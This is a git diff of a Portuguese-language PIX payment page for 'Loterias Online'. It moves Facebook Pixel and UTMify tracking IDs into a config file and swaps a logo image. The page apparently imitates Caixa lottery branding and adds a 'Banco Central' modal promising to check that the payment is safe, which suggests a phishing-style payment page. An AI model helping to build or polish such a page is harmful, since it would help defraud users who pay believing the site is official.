@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Configurações -->
+    <script src="../js/config.js"></script>
+    
 <!-- Facebook Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
@@ -11,7 +17,7 @@ n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '870105399174706');
+fbq('init', window.APP_CONFIG.FACEBOOK_PIXEL_ID);
 fbq('track', 'PageView');
 </script>
 <noscript><img height="1" width="1" style="display:none"
@@ -21,8 +27,8 @@ src="https://www.facebook.com/tr?id=870105399174706&ev=PageView&noscript=1"
 
 <!-- UTMify Pixel -->
 <script>
-  window.pixelId = "692bbc5276ee30509ec1a3dd";
-  window.utmifyApiId = "9eiWCeM87Zp8Ldc60KJRNUehJHsIcDtltBXv";
+  window.pixelId = window.APP_CONFIG.UTMIFY_PIXEL_ID;
+  window.utmifyApiId = window.APP_CONFIG.UTMIFY_API_ID;
   var a = document.createElement("script");
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
@@ -30,8 +36,6 @@ src="https://www.facebook.com/tr?id=870105399174706&ev=PageView&noscript=1"
   document.head.appendChild(a);
 </script>
 <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pagamento via PIX - Loterias Online</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -221,7 +225,7 @@ src="https://www.facebook.com/tr?id=870105399174706&ev=PageView&noscript=1"
 <body class="bg-gray-50">
     <header class="bg-caixa-blue h-16 flex items-center">
         <div class="container mx-auto px-4">
-            <img src="../images/6t2FIF6XwnOH.webp" alt="Loterias CAIXA" class="h-8">
+            <img src="../images/logos.png" alt="Loterias CAIXA" class="h-8">
         </div>
     </header>
 
@@ -346,7 +350,7 @@ src="https://www.facebook.com/tr?id=870105399174706&ev=PageView&noscript=1"
             <div class="modal-content" style="border: none; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
                 <div class="modal-header" style="background: linear-gradient(135deg, #0070ae, #005ca9); color: white; border-radius: 12px 12px 0 0; border: none; padding: 20px;">
                     <div class="d-flex align-items-center w-100">
-                        <img src="../images/6t2FIF6XwnOH.webp" alt="Banco Central" style="width: 40px; height: 40px; margin-right: 15px; border-radius: 8px;">
+                        <img src="../images/logos.png" alt="Banco Central" style="width: 40px; height: 40px; margin-right: 15px; border-radius: 8px;">
                         <h5 class="modal-title mb-0" id="securityModalLabel" style="font-weight: 600;">Verificar se o Pagamento é Seguro</h5>
                     </div>
                 </div>
